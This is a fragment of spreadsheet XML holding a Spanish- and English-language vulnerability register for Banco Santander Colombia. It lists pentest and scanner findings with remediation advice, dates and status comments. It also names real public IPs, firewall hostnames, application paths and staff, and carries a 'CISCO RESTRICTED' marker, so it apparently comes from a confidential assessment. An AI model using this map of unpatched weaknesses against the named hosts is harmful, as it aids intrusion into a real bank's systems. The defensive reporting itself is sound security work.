  </si>
  <si>
    <t>Ausencia de Cabecera CSP (Content-security-Policy)</t>
  </si>
  <si>
    <t>se ha identificado la ausencia de la cabecera CSP (Content_Security_Policy)
mediante las cabeceras de respuesta http</t>
  </si>
  <si>
    <t>Configure el servidor web para devolver la cabecera Content-Security-Policy HTTP. Es
recomendable que se establezca la política “default-src ‘self’ para que el contenido provenga
del mismo origen del sitio. Un ejemplo de la política sería:
Content-Security-Policy: default-src 'self'</t>
  </si>
  <si>
    <t>CSP (Content Security Policy) es una capa añadida de seguridad que ayuda a detectar y mitigar determinados tipos de ataques, incluyendo ataques Cross-Site Scripting (XSS) y de inyección de datos. Estos ataques se pueden utilizar para realizar todo tipo de técnicas, desde el robo de datos hasta site defacement, pasando por la distribución de malware. CSP proporciona una serie de cabeceras HTTP estándar que permiten que los propietarios de los sitios web declaren que fuentes de contenido se consideran legitimas para que los puedan usarlas. Por ejemplo, JavaScript, CSS, tramas HTML, fuentes, imágenes y archivos incrustables como applets Java, ActiveX y archivos de audio y vídeo.</t>
  </si>
  <si>
    <t>BSNC-2019-018</t>
  </si>
  <si>
    <t>MAN-73a2e327</t>
  </si>
  <si>
    <t>CO-19-MANU-01-AP-008</t>
  </si>
  <si>
    <t>Fuga de información de rutas internas</t>
  </si>
  <si>
    <t>Se ha detectado que la aplicación devuelve información acerca de rutas internas del sistema de
ficheros del servidor. Esta información podría ser utilizada por un atacante con el objetivo de
recabar información para ataques futuros.</t>
  </si>
  <si>
    <t>Se recomienda evitar que la aplicación devuelva al usuario información relativa al funcionamiento interno del servidor, como pueden ser rutas internas o ubicación de ficheros o directorios dentro del mismo. Para ello, se recomienda modificar la página de error "404 not found".</t>
  </si>
  <si>
    <t>Se ha detectado que la aplicación devuelve información acerca de rutas internas del sistema
de ficheros del servidor. Esta información podría ser utilizada por un atacante con el objetivo
de recabar información para ataques futuros.</t>
  </si>
  <si>
    <t>BSNC-2019-020</t>
  </si>
  <si>
    <t>MAN-73a2e326</t>
  </si>
  <si>
    <t>CO-19-MANU-01-CO-007</t>
  </si>
  <si>
    <t>Suite de cifrado SSL de 64-bit Soportada (SWEET32)</t>
  </si>
  <si>
    <t>El activo "confirming.santander.com.co " es vulnerable a SWEET32</t>
  </si>
  <si>
    <t>Se recomienda reconfigurar la aplicación afectada, si es posible, para evitar el uso de todos los
cifrados de bloques de 64 bits. Como alternativa, coloque limitaciones en el número de solicitudes que se permiten procesar sobre la misma conexión TLS para mitigar esta vulnerabilidad.</t>
  </si>
  <si>
    <t>El servidor admite el uso de un cifrado de bloque con bloques de 64 bits en una o más suites
de cifrado. Está afectado por una vulnerabilidad, conocida como SWEET32, debido al uso de
cifrados débiles.
Un ataque Man in the Middle con recursos suficientes puede explotar esta vulnerabilidad.</t>
  </si>
  <si>
    <t>A2 20190509_2.3.1.c_CO_20200728_N_06</t>
  </si>
  <si>
    <t>Confirming &amp; Factoring\Bot</t>
  </si>
  <si>
    <t>MAN-18af2323</t>
  </si>
  <si>
    <t>CO-19-AUTO-02-CO-002</t>
  </si>
  <si>
    <t>Solved</t>
  </si>
  <si>
    <t>64.76.90.137</t>
  </si>
  <si>
    <t>confirming-factoring.santander.com.co</t>
  </si>
  <si>
    <t>1ª Fecha: 28/12/2020</t>
  </si>
  <si>
    <t>1ª Fecha: 18/12/2020</t>
  </si>
  <si>
    <t>Se encuentra el uso de funciones de Zoom Search Engine 5.0: /factoring/ayuda/zoom_search.js</t>
  </si>
  <si>
    <t>Sin definir</t>
  </si>
  <si>
    <t>Certificada</t>
  </si>
  <si>
    <t>Jaime Orlando Vargas Martinez</t>
  </si>
  <si>
    <t>A2 20190509_2.3.1.c_CO_20200728_N_05</t>
  </si>
  <si>
    <t>MAN-18af2329</t>
  </si>
  <si>
    <t>CO-19-AUTO-02-CO-008</t>
  </si>
  <si>
    <t>Renegociación segura de SSL iniciada por el cliente</t>
  </si>
  <si>
    <t>Se recomienda actualizar el servidor web a la última versión, ya que las últimas versiones de Apache y nginx no permiten la renegociación SSL iniciada por el cliente.</t>
  </si>
  <si>
    <t>El proceso de negociación del cifrado SSL utiliza significativamente más recursos en el servidor que en el cliente. Si el cliente puede iniciar el proceso de renegociación, un atacante puede hacer que el servidor deje de estar disponible con un ataque de denegación de servicio.</t>
  </si>
  <si>
    <t>A2 20190509_2.3.1.c_CO_20200728_N_03</t>
  </si>
  <si>
    <t>MAN-647bb2aa</t>
  </si>
  <si>
    <t>CO-19-MANU-02-AP-004</t>
  </si>
  <si>
    <t>Librerías de JavaScript desactualizadas</t>
  </si>
  <si>
    <t>Durante la auditoria se ha identificado la librería de JavaScript jQuery en su versión 1.3.2 la cual
contiene vulnerabilidades, con CVE asociado, conocidas como:
 CVE-2019-11358
 CVE-2016-10707
 CVE-2016-7103
 CVE-2015-9251
 CVE-2014-6071
 CVE-2012-6708
 CVE-2011-4969
 CVE-2007-2379
Adicionalmente, se ha identificado el Framework de JavaScript “Prototype” en su versión 1.6.0.3
la cual contiene vulnerabilidades, con CVE asociado, conocidas como:
 CVE-2008-7220
 CVE-2007-2383</t>
  </si>
  <si>
    <t>Se recomienda analizar la posibilidad de actualizar la librería afectada a la última versión
disponible. En concreto:
 Prototype. Última versión estable 1.7.3 (http://prototypejs.org/)
 jQuery. Última versión estable 3.4.1 (https://jquery.com/download/)
Adicionalmente se recomienda realizar el monitoreo regular de las actualizaciones de las
librerías en uso para todas las aplicaciones y asegurarse de instalarlas en un tiempo prudencial.</t>
  </si>
  <si>
    <t>Un individuo malicioso podría comprometer con mayor facilidad las librerías afectadas, ya que
las versiones observadas poseen vulnerabilidades y/o debilidades de seguridad previamente
reportadas. Las vulnerabilidades mencionadas son de conocimiento público y los detalles de
las mismas se encuentran disponibles. En consecuencia, un individuo malicioso podría intentar
explotarlas para comprometer a los usuarios de la aplicación.</t>
  </si>
  <si>
    <t>A2 20190509_2.3.1.c_CO_20200728_N_04</t>
  </si>
  <si>
    <t>MAN-647bb2ab</t>
  </si>
  <si>
    <t>CO-19-MANU-02-AP-005</t>
  </si>
  <si>
    <t>Errores no controlados</t>
  </si>
  <si>
    <t xml:space="preserve">se ha identificado que, al modificar la petición original, el servidor
responde con un error, mostrando una función interna de la aplicación. En concreto:
 https://confirming-factoring.santander.com.co
 Menú: Consultar ejecuciones Generales /Procesos Automáticos
Al realizar una búsqueda, se para la petición mediante un proxy intermedio (BurpSuite) y se
modifica el campo “formSearchCiclo%3Afecha_desdeField%3Aecha_inicioInputCurrentDate”
introduciendo un valor no esperado por la aplicación, por ejemplo, una comilla simple, la aplicación responde mostrando información
interna de la aplicación, en concreto una función de Java
</t>
  </si>
  <si>
    <t>Se deben controlar todas las entradas o valores que el aplicativo recibe por parte del cliente,
y realizar un tratamiento seguro de sus valores evitando proporcionar información útil a un
posible atacante.
Adicionalmente para no proporcionar información al atacante se recomienda personalizar las
páginas de error para que no sean descriptivas.</t>
  </si>
  <si>
    <t>El servidor Web al recibir una petición no esperada reacciona mostrando una página de error
que revela información sensible de la plataforma subyacente. Con esta información un
atacante puede realizar ataques dirigidos con mayor criticidad y éxito sobre los sistemas y
aplicaciones.</t>
  </si>
  <si>
    <t>BSNC-2019-101</t>
  </si>
  <si>
    <t>Portal Web</t>
  </si>
  <si>
    <t>MAN-4c3ceca0</t>
  </si>
  <si>
    <t>CO-19-MANU-01-VE-009</t>
  </si>
  <si>
    <t>Librerias de Javascript vulnerables</t>
  </si>
  <si>
    <t>170.169.33.93</t>
  </si>
  <si>
    <t>www.santander.com.co</t>
  </si>
  <si>
    <t>1ª Fecha:
2ª Fecha:</t>
  </si>
  <si>
    <t>1ª Fecha:
2ª Fecha:23/08/2020</t>
  </si>
  <si>
    <t>La confirmación del uso de una versión vulnerable de la biblioteca javascript
Https://www.santander.com.co/js/jquery-1.10,2.min.js
Version: Jquery 1.10.2</t>
  </si>
  <si>
    <t>Actualizar las librerias de JavaScript a la última versión</t>
  </si>
  <si>
    <t>Se detectaron bibliotecas Java Script Jquery obsoletas, las cuales pueden ser explotadas mediante secuencias de comandos entre sitios (XSS).</t>
  </si>
  <si>
    <t>A2 20190509_2.3.1.c_CO_20200611_R</t>
  </si>
  <si>
    <t>BSNC-2019-102</t>
  </si>
  <si>
    <t>MAN-4c3ced42</t>
  </si>
  <si>
    <t>CO-19-MANU-01-VE-010</t>
  </si>
  <si>
    <t>Librerias de Bootstrap vulnerables</t>
  </si>
  <si>
    <t>1ª Fecha: 17/12/2019
2ª Fecha: 11/06/2020</t>
  </si>
  <si>
    <t>1ª Fecha: 30/04/2020
2ª Fecha: 04/09/2020</t>
  </si>
  <si>
    <t>La confirmación del uso de una versión vulnerable de la biblioteca javascript
https://www.santander.com.co/js/bootstrap.min.js
Versión:Bootstrap 3.0.2</t>
  </si>
  <si>
    <t>Actualizar las librerias de Bootstrap a la última versión</t>
  </si>
  <si>
    <t>Se detectaron bibliotecas Bootstrap obsoletas, las cuales pueden ser explotadas mediante secuencias de comandos entre sitios (XSS). Esto puede conducir a diferentes problemas para los usuarios de la aplicación.</t>
  </si>
  <si>
    <t>MAN-647bb2a7</t>
  </si>
  <si>
    <t>CO-19-MANU-02-AP-001</t>
  </si>
  <si>
    <t>Información sensible en Metadatos de Ficheros</t>
  </si>
  <si>
    <t>Se ha evidenciado una serie de nombres de usuarios en los metadatos de
los ficheros PDF, los cuales se han identificado dentro de las páginas webs del alcance.</t>
  </si>
  <si>
    <t>Se recomienda eliminar toda la información contenida en los metadatos de los documentos
generados y/o publicados en la aplicación. Adicionalmente, se recomienda implementar un
procedimiento para controlar los documentos a publicar para garantizar que los mismos no
contengan información sensible de la organización en sus metadatos.</t>
  </si>
  <si>
    <t>Los metadatos de un fichero o documento pueden revelar tanta o más información que el
contenido de las comunicaciones. Las fugas de información sensible son realizadas, en
numerosas ocasiones, a través de los metadatos de los ficheros publicados, que desvelan entre
otros datos, usuarios o nombres de personas de la empresa.</t>
  </si>
  <si>
    <t>BSNC-2020-002</t>
  </si>
  <si>
    <t>MAN-18af232a</t>
  </si>
  <si>
    <t>CO-19-AUTO-02-CO-007</t>
  </si>
  <si>
    <t>Corresponde a un Falso Positivo</t>
  </si>
  <si>
    <t>A2 20190509_2.3.1.c_CO_20200612_N_08</t>
  </si>
  <si>
    <t>MAN-647bb2ac</t>
  </si>
  <si>
    <t>CO-19-MANU-02-AP-006</t>
  </si>
  <si>
    <t>Métodos HTTP no seguros permitidos</t>
  </si>
  <si>
    <t>1ª Fecha: 12/06/2020</t>
  </si>
  <si>
    <t>2ª Fecha: 13/11/2020</t>
  </si>
  <si>
    <t>se han identificado métodos http los cuales no son seguros y podrían
suponer un riesgo para el servidor, en concreto, se han detectado los métodos: PUT, DELETE,
TRACE y PATCH.</t>
  </si>
  <si>
    <t>Se recomienda analizar la posibilidad de evaluar si el método HTTP extendido identificado es
requerido por razones de negocio y deshabilitarlo en caso de no ser requerido. Asimismo, se
recomienda analizar la posibilidad de revisar los estándares de configuración de los sistemas,
para asegurar que métodos potencialmente peligrosos se encuentren deshabilitados y
asegurar su consistencia en toda la organización.</t>
  </si>
  <si>
    <t>Los servidores Web utilizan ciertos métodos o funciones propias del protocolo HTTP para
funcionar siendo los más utilizados GET, POST y HEAD. Como resultado del análisis de los
servicios Web internos se ha detectado que los recursos afectados permiten utilizar métodos
HTTP adicionales (OPTIONS, TRACE, GET, HEAD, DELETE, PUT, POST, COPY, MOVE, MKCOL,
PROPFIND, PROPPATCH, LOCK, UNLOCK, SEARCH) los cuales podrían no ser requeridos
debilitando la seguridad de dichos servicios Web.</t>
  </si>
  <si>
    <t>BSNC-2020-001</t>
  </si>
  <si>
    <t>MAN-73a2e325</t>
  </si>
  <si>
    <t>CO-19-MANU-01-AP-006</t>
  </si>
  <si>
    <t>Fuga de información de aplicación y versión</t>
  </si>
  <si>
    <t>Durante las pruebas realizadas, se ha comprobado que la página de error "404 not found" por defecto de Tomcat muestra información interna acerca de la aplicación utilizada.</t>
  </si>
  <si>
    <t>Se recomienda modificar la página por defecto "404 not found" para evitar que la aplicación devuelva al usuario información relativa a la naturaleza y versión de la misma.</t>
  </si>
  <si>
    <t>Se ha detectado que la aplicación devuelve información acerca de la versión y aplicación utilizadas. Esta información podría ser utilizada por un atacante con el objetivo de recabar información para ataques futuros.</t>
  </si>
  <si>
    <t>BSNC-2020-003</t>
  </si>
  <si>
    <t>MAN-18af232d</t>
  </si>
  <si>
    <t>CO-19-AUTO-02-CO-010</t>
  </si>
  <si>
    <t>Ausencia de HTTP Strict Transport Security (HSTS)</t>
  </si>
  <si>
    <t>Las url afectadas son: 
/js/bootstrap-paginator.js 
/js/cookiesUtils.js 
/recursos/imagenes/home_142.jpg 
 /recursos/imagenes/home_63.jpg</t>
  </si>
  <si>
    <t>Se recomienda configurar el servidor remoto para que en las cabeceras de respuesta se incluya la cabecera HSTS incluyendo un período de validez estimado de la política en el propio navegador.</t>
  </si>
  <si>
    <t>La política HSTS o HTTP Strict Transport Security es un mecanismo soportado por los principales servidores web –Apache, NGNIX- y la mayoría de navegadores, que reduce las posibilidades de que un atacante pueda interceptar nuestras comunicaciones y recopilar cookies y datos similares intercambiados durante la sesión. El estándar permite que el servidor y el navegador web interactúen de manera más fiable, empleando protocolos de transporte cifrados como TSL/SSL. Así, es capaz de acabar con variados ataques de red y también con algunos errores cometidos por los desarrolladores de los distintos sites (por ejemplo, el uso de conexiones no seguras para descargar recursos de la web). De esta manera y al margen de determinar cómo deben actuar el navegador y el servidor, HSTS incorpora una cabecera HSTS (Strict-Transport-Security), que fuerza a utilizar un canal cifrado, HTTPS, para la comunicación entre el navegador del usuario y el servidor. A partir del momento en el que el navegador recibe una cabecera HSTS en las cabeceras de respuesta del servidor, todas las peticiones a este dominio y subdominios serán realizadas mediante HTTPS. Asimismo, las cabeceras HSTS, quedarán almacenadas en el navegador (en forma de lista), algo que se aplicará durante un tiempo determinado que se establece en la propia cabecera de respuesta.</t>
  </si>
  <si>
    <t>Qualys</t>
  </si>
  <si>
    <t>BSNC-2020-004</t>
  </si>
  <si>
    <t>QA-1701663040</t>
  </si>
  <si>
    <t>SSL/TLS Server supports TLSv1.0</t>
  </si>
  <si>
    <t>Vendor</t>
  </si>
  <si>
    <t>TCP</t>
  </si>
  <si>
    <t>Deshabilite el uso del protocolo TLSv1.0 a favor de un protocolo criptográficamente más fuerte como TLSv1.2.
Los siguientes comandos de openssl se pueden usar para hacer una prueba manual:
openssl s_client -connect ip: puerto -tls1
Si la prueba es exitosa, entonces el objetivo</t>
  </si>
  <si>
    <t>Un atacante puede explotar defectos criptográficos para realizar ataques de tipo intermediario o para descifrar comunicaciones. &lt;P&gt;
Por ejemplo: un atacante podría forzar una degradación del protocolo TLS al antiguo protocolo SSLv3.0 y explotar el POODLE vulnerabi</t>
  </si>
  <si>
    <t>QA-94188246370</t>
  </si>
  <si>
    <t>SSL Certificate - Subject Common Name Does Not Match Server FQDN</t>
  </si>
  <si>
    <t>Vulnerabilidad presente, debido a que el certificado presente por IP no coincide con el del FQDN (confirming-factoring.santander.com.co), por este motivo se confirma la vulnerabilidad, que conllevaría a la posible situación de cifrado sin autenticación</t>
  </si>
  <si>
    <t xml:space="preserve">
Instale un certificado de servidor cuyo Asunto commonName o subjectAltName coincida con el FQDN del servidor.</t>
  </si>
  <si>
    <t>Un atacante man-in-the-middle puede explotar esta vulnerabilidad junto con un ataque de envenenamiento de caché DNS para atraer al cliente a otro servidor y luego robar toda la comunicación de cifrado.</t>
  </si>
  <si>
    <t>QA-94188219979</t>
  </si>
  <si>
    <t>HTTP Security Header Not Detected</t>
  </si>
  <si>
    <t xml:space="preserve">
&lt;B&gt; Nota: &lt;/B&gt; Para depurar mejor los resultados de este QID, se solicita que los clientes ejecuten comandos para simular la siguiente funcionalidad: curl -lkL --verbose. &lt;P&gt;
CWE-693: Falla del mecanismo de protección menciona lo siguiente: el producto no</t>
  </si>
  <si>
    <t xml:space="preserve">
Dependiendo de la vulnerabilidad que se explota, un atacante remoto no autenticado podría realizar scripts de sitios, clickjacking o ataques de detección de tipo MIME.</t>
  </si>
  <si>
    <t>Task Force</t>
  </si>
  <si>
    <t>Telecomunicaciones</t>
  </si>
  <si>
    <t>Internet invitados Backup Santander (Wifi Backup)</t>
  </si>
  <si>
    <t xml:space="preserve">SSL Certificate Not Signed By A Trusted Authority </t>
  </si>
  <si>
    <t>CWE-296: Improper Following of Chain of Trust for Certificate Validation</t>
  </si>
  <si>
    <t>181.48.20.105</t>
  </si>
  <si>
    <t>The following certificate was part of the certificate chain sent by the remote host, but it has expired : Subject : 2.5.4.41=AR161-Self-Signed-Certificate-21500102122SHB600935 Not After : Apr 02 00:00:00 2010 GMT The following certificate was at the top of the certificate chain sent by the remote host, but it is signed by an unknown certificate authority : Subject : 2.5.4.41=AR161-Self-Signed-Certificate-21500102122SHB600935 Issuer : 2.5.4.41=AR161-Self-Signed-Certificate-21500102122SHB600935</t>
  </si>
  <si>
    <t>Cisco recommends that SSL services always use certificates signed by an authority that clients belonging to normal system users will trust.
The vendor for each supported client will be able to provide an up-to-date list of certificate authorities who are trusted by default. One of these will be required to sign the certificate for each affected service.</t>
  </si>
  <si>
    <t>181.48.20.104</t>
  </si>
  <si>
    <t>The following certificate was part of the certificate chain sent by the remote host, but it has expired : Subject : 2.5.4.41=AR161-Self-Signed-Certificate-
186021MISC : Banco Santander (PID 894366) IR Complementary Pen Test 25
CISCO RESTRICTED
21500102122SHB600935 Not After : Apr 02 00:00:00 2010 GMT The following certificate was at the top of the certificate chain sent by the remote host, but it is signed by an unknown certificate authority : Subject : 2.5.4.41=AR161-Self-Signed-Certificate-21500102122SHB600935 Issuer : 2.5.4.41=AR161-Self-Signed-Certificate-21500102122SHB600935</t>
  </si>
  <si>
    <t>fw.santander.com.co/Peer del Firewall</t>
  </si>
  <si>
    <t>170.169.127.22</t>
  </si>
  <si>
    <t>The following certificate was at the top of the certificate chain sent by the remote host, but it is signed by an unknown certificate authority : Subject : O=InternetNala..fgvprc Issuer : O=InternetNala..fgvprc</t>
  </si>
  <si>
    <t>Internet Backup Santander (Cableada</t>
  </si>
  <si>
    <t xml:space="preserve">Network Time Protocol (NTP) Allows Mode 6 Queries </t>
  </si>
  <si>
    <t>CWE-406: Insufficient Control of Network Message Volume (Network Amplification)</t>
  </si>
  <si>
    <t>UDP</t>
  </si>
  <si>
    <t>Cisco elicited the following response from the remote host by sending an NTP mode 6 query : 'version="4", processor="unknown", system="UNIX", leap=3, stratum=16, precision=-21, rootdelay=, rootdisp=, refid=INIT, reftime=0x00000000.00000000, clock=0xE0C57C60.745BE732, peer=0, tc=3, mintc=3, offset=, frequency=, sys_jitter=, clk_jitter=, clk_wander='</t>
  </si>
  <si>
    <t>Cisco recommends disabling the NTP server, or if the NTP server is required, Cisco recommends that ACLs are set in order to only allow the access to this service to the IP addresses that use this service.
In case of Cisco IOS devices, it is not allowed to disable Mode 6 queries.</t>
  </si>
  <si>
    <t>En proceso de certificacion.
No fue certificada
Susana Tovar: La red ya no existen
Javier Leon: dado que el servicio se canceló y  que son segmentos públicos el proveedor de servicio reasigno el direccionamiento a otro cliente.</t>
  </si>
  <si>
    <t>Cisco elicited the following response from the remote host by sending an NTP mode 6 query : 'version="4", processor="unknown", system="UNIX", leap=3, stratum=16, precision=-21, rootdelay=, rootdisp=, refid=INIT, reftime=0x00000000.00000000, clock=0xE0C5B1FC.6E124E27, peer=0, tc=3, mintc=3, offset=, frequency=, sys_jitter=, clk_jitter=,clk_wander='</t>
  </si>
  <si>
    <t>Internet principal Santander (Cableada)</t>
  </si>
  <si>
    <t>181.48.106.210</t>
  </si>
  <si>
    <t>Cisco elicited the following response from the remote host by sending an NTP mode 6 query : 'version="4", processor="unknown", system="UNIX", leap=3, stratum=16, precision=-21, rootdelay=, rootdisp=, refid=INIT, reftime=0x00000000.00000000, clock=0xE0C5B209.4748434E, peer=0, tc=3, mintc=3, offset=, frequency=, sys_jitter=, clk_jitter=, clk_wander='</t>
  </si>
  <si>
    <t xml:space="preserve">Potentially Unnecessary Services </t>
  </si>
  <si>
    <t>CWE-0: Insecure Configuration</t>
  </si>
  <si>
    <t>181.48.106.209</t>
  </si>
  <si>
    <t>The Team identified the presence of services not usually required for normal operations. For instance, NTP and SNMP services were observed exposed to the Internet.
The Team also identified SSH and Telnet services exposed; however, the connection to these services is terminated from the server before reaching the login prompt.</t>
  </si>
  <si>
    <t>Cisco recommends that any services not strictly necessary for normal operations are either disabled or removed completely.</t>
  </si>
  <si>
    <t>181.48.20.111</t>
  </si>
  <si>
    <t>Internet invitados principal Santander (Wifi Ppal)</t>
  </si>
  <si>
    <t>181.49.176.1</t>
  </si>
  <si>
    <t>181.49.176.0</t>
  </si>
  <si>
    <t>181.49.176.7</t>
  </si>
  <si>
    <t xml:space="preserve">SSL Service Uses Expired Certificates </t>
  </si>
  <si>
    <t>CWE-298: Improper Validation of Certificate - Expiration</t>
  </si>
  <si>
    <t>The SSL certificate has already expired : 
Subject : n/a 
Issuer : n/a 
Not valid before : Apr 2 00:00:00 2000 GMT 
Not valid after : Apr 2 00:00:00 2010 GMT</t>
  </si>
  <si>
    <t>Cisco recommends that any expired SSL Certificate is renewed as soon as possible if SSL continues to be required.</t>
  </si>
  <si>
    <t>Check Point ‘SecuRemote’ Hostname Information Disclosure</t>
  </si>
  <si>
    <t>CWE-201: Information Exposure Through Sent Data</t>
  </si>
  <si>
    <t>181.49.176.4</t>
  </si>
  <si>
    <t>Firewall host : FWCOLBSNC1 
SmartCenter host : InternetNala</t>
  </si>
  <si>
    <t>Cisco recommends that access to this service is limited to only those IP addresses specifically requiring it.</t>
  </si>
  <si>
    <t>Firewall host : FWCORE02_VPN_Nala 
SmartCenter host : InternetNala</t>
  </si>
  <si>
    <t>181.49.176.5</t>
  </si>
  <si>
    <t>Firewall host : FWCOLBSNC2 
SmartCenter host : InternetNala</t>
  </si>
  <si>
    <t xml:space="preserve">Cisco IOS IKEv1 Packet Handling Remote Information Disclosure </t>
  </si>
  <si>
    <t>CWE-0: Missing Security Patches</t>
  </si>
  <si>
    <t>Cisco was able to get the following IKE vendor ID(s) : 
CISCO-DELETE-REASON 
FLEXVPN-SUPPORTED</t>
  </si>
  <si>
    <t>Cisco recommends upgrading to the relevant fixed version referenced in Cisco bug ID CSCvb29204.</t>
  </si>
  <si>
    <t>Cisco was able to get the following IKE vendor ID(s) : 
CISCO-DELETE-REASON FLEXVPN-SUPPORTED</t>
  </si>
  <si>
    <t xml:space="preserve">SSL Certificate Signed Using A Weak Hashing Algorithm </t>
  </si>
  <si>
    <t>CWE-327: Use of a Broken or Unreliable Cryptographic Algorithm</t>
  </si>
  <si>
    <t>The following certificates were part of the certificate chain sent by 
the remote host, but contain hashes that are considered to be weak. 
Subject : O=InternetNala..fgvprc 
Signature Algorithm : SHA-1 With RSA Encryption 
Valid From : Sep 12 14:32:37 2013 GMT 
Valid To : Sep 07 14:32:37 2033 GMT 
Subject : O=InternetNala..fgvprc/CN=VPN_Nala VPN 
Certificate Signature Algorithm : SHA-1 With RSA Encryption 
Valid From : Oct 16 03:24:58 2016 GMT 
Valid To : Oct 16 03:24:58 2021 GMT</t>
  </si>
  <si>
    <t>Cisco recommends that only SSL certificates with a strong hashing algorithm, such as SHA256, are used.</t>
  </si>
  <si>
    <t xml:space="preserve">Internet Key Exchange (IKE) Aggressive Mode With Pre-Shared Key  </t>
  </si>
  <si>
    <t>190.216.136.242 Notify message 14 (NO-PROPOSAL-CHOSEN) 
HDR=(CKY-R=c9abf8bedbdd981a)</t>
  </si>
  <si>
    <t>Cisco recommends disabling Aggressive Mode and discontinuing the use of PSK for authentication, where possible. If, however, the use of PSK cannot be avoided, then only very strong keys should be used. In addition, where possible, VPN connections should not be permitted from arbitrary IP addresses, although Cisco recognises that this may be impractical for roaming users.</t>
  </si>
  <si>
    <t>190.216.136.241 Notify message 14 (NO-PROPOSAL-CHOSEN) 
HDR=(CKY-R=9edf4bb7af18e785)</t>
  </si>
  <si>
    <t>181.48.106.209 Notify message 14 (NO-PROPOSAL-CHOSEN) 
HDR=(CKY-R=da7f53d3bac5babb)</t>
  </si>
  <si>
    <t>181.48.106.210 Notify message 14 (NO-PROPOSAL-CHOSEN) 
HDR=(CKY-R=8361bdd290f487fd)</t>
  </si>
  <si>
    <t xml:space="preserve">IPSec IKE Detection </t>
  </si>
  <si>
    <t>CWE-200: Information Exposure</t>
  </si>
  <si>
    <t>181.49.176.3</t>
  </si>
  <si>
    <t>Cisco recommends that this service is disabled if it is not required, or alternatively that incoming traffic to the affected port is filtered.</t>
  </si>
  <si>
    <t>Cisco was able to get the following IKE vendor ID(s): 
IKE Fragmentation 
Firewall-1 Unknown Vsn</t>
  </si>
  <si>
    <t>En proceso de Certificacion.
Se envió la evidencia para aceptar la vulnerabilidad, dado a que por el puerto 500 esta establacida la VPN</t>
  </si>
  <si>
    <t xml:space="preserve">System Responds To ICMP ‘Timestamp’ Requests </t>
  </si>
  <si>
    <t>This host returns non-standard timestamps (high bit is set)</t>
  </si>
  <si>
    <t>Cisco recommends that, wherever possible, systems should be configured not to respond to any ICMP requests. In addition, each firewall should be configured to drop all ICMP traffic. Where a case can be made for ICMP traffic to be allowed, it should be restricted by type and only to known, trusted hosts.</t>
  </si>
  <si>
    <t>The difference between the local and remote clocks is 3041 seconds.</t>
  </si>
  <si>
    <t>The difference between the local and remote clocks is 2862 seconds.</t>
  </si>
  <si>
    <t>The difference between the local and remote clocks is 2863 seconds.</t>
  </si>
  <si>
    <t>A2 20190509_2.3.1.c_CO_20200612_N_10</t>
  </si>
  <si>
    <t xml:space="preserve">Web Application Includes Files From A Third-Party </t>
  </si>
  <si>
    <t>CWE-830: Inclusion of Web Functionality from an Untrusted Source</t>
  </si>
  <si>
    <t>1ª Fecha: 09/09/2020</t>
  </si>
  <si>
    <t>La respuesta incluye dinámicamente el siguiente guión de otro dominio: 
- https://ajax.googleapis.com/ajax/libs/jquery/3.1.1/jquery.min.js 
- https://platform.twitter.com/oct.js 
- https://sb.scorecardresearch.com/c2/16058935/cs.js 
- https://www.youtube.com/iframe_api 
- https://www.youtube.com/player_api 
- https://www.images-home.com/image.js</t>
  </si>
  <si>
    <t xml:space="preserve">
Cisco recomienda que no se utilicen dominios cruzados, particularmente de sistemas controlados por terceros. Siempre que sea posible, la aplicación web debe ser autónoma y cualquier copia incluida de los hosts remotos y colocada en el servidor web que aloja la aplicación.</t>
  </si>
  <si>
    <t>BSNC-2020-005</t>
  </si>
  <si>
    <t>La respuesta incluye dinámicamente el siguiente guión de otro dominio: 
- https://www.images-home.com/image.js</t>
  </si>
  <si>
    <t>Cisco recomienda que no se utilicen dominios cruzados, particularmente de sistemas controlados por terceros. Siempre que sea posible, la aplicación web debe ser autónoma y cualquier copia incluida de los hosts remotos y colocada en el servidor web que aloja la aplicación.</t>
  </si>
  <si>
    <t>El script puede hacer cualquier cosa que los propios scripts de la aplicación puedan hacer, como acceder a los datos de la aplicación y realizar acciones dentro del contexto del usuario actual.</t>
  </si>
  <si>
    <t>N/A</t>
  </si>
  <si>
    <t>Web Application Does Not Use ‘HTTPOnly’ Cookies</t>
  </si>
  <si>
    <t>The Team observed that the ‘HTTPOnly’ attribute was not set.</t>
  </si>
  <si>
    <t>Cisco recommends that the web application is reconfigured to use ‘HTTPOnly’ cookies.
PHP can be configured to set the ‘HTTPOnly’ attribute on all cookies by setting ‘session.cookie_httponly’ to ‘true’ in ‘php.ini’.
The ‘HTTPOnly’ attribute can be set on a page-by-page basis as follows:
session_set_cookie_params(null, null, null, null, true); session_start();
Sun Java EE has supported the ‘HTTPOnly’ flag in the Cookie interface since version 6 (Servlet class version 3), as well as for session cookies (‘JSESSIONID’). Methods ‘setHttpOnly’ and ‘isHttpOnly’ can be used to set and check for ‘HTTPOnly’ value in the cookies.
For older versions the workaround is to rewrite the ‘JSESSIONID’ value using and setting it as a custom header:
String sessionid = request.getSession().getId();
response.setHeader("SET-COOKIE", "JSESSIONID=" + sessionid + "; HttpOnly");</t>
  </si>
  <si>
    <t>Esta vulnerabilidad no se encuentra presente en ningun activo que pertenezca a BSNC</t>
  </si>
  <si>
    <t xml:space="preserve">Web Application Can Be Embedded In Third-Party Websites </t>
  </si>
  <si>
    <t>CWE-668: Exposure of Resource to Wrong Sphere</t>
  </si>
  <si>
    <t>El Equipo estableció que la aplicación web podía incorporarse a sitios web de terceros utilizando iFrames.</t>
  </si>
  <si>
    <t>Cisco recomienda que, en los casos en que la aplicación necesite ser incorporada en una aplicación de terceros, el servidor web se reconfigure de manera que las respuestas incluyan el siguiente encabezado personalizado, que indique a los navegadores modernos que la representación de la página dentro de un iFrame está prohibida, o que sólo se acepta de los dominios especificados:
X-Frame-Options: Deny 
X-Frame-Options: Allow-From https://some.othersite.com
Alternativamente, Cisco recomienda utilizar el JavaScript para evitar que la aplicación se incruste en otra página web.
Nota: Aunque el encabezado 'X-Frame-Options' es soportado por los principales navegadores, nunca fue estandarizado y ha sido desaprobado en favor de la directiva 'frame-ancestors' de la especificación CSP Nivel 2. Sin embargo, se recomienda que el encabezado 'X-Frame-Options' actualmente soportado y la recién introducida directiva 'frame-ancestor' se utilicen para garantizar la protección contra todas las amenazas conocidas en todos los escenarios.</t>
  </si>
  <si>
    <t>A2 20190509_2.3.1.c_CO_20200612_N_09</t>
  </si>
  <si>
    <t xml:space="preserve">Web Application Discloses Information To Third-Party  </t>
  </si>
  <si>
    <t>1ª Fecha: 13/11/2020</t>
  </si>
  <si>
    <t>La aplicación contiene el siguiente enlace a otro dominio desde URL que contienen una línea de consulta: 
- https://ajax.googleapis.com/ajax/libs/jquery/3.1.1/jquery.min.js 
